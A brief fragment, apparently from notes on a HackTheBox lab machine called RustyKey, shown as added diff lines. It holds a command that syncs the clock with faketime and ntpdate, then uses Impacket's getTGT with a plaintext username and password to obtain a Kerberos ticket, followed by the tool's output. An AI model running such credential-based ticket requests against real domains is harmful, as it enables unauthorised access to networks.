@@ -1,0 +1,4 @@
+faketime "$(ntpdate -q 10.10.11.75 | cut -d ' ' -f 1,2)" impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+[*] Saving ticket in rr.parker.ccache
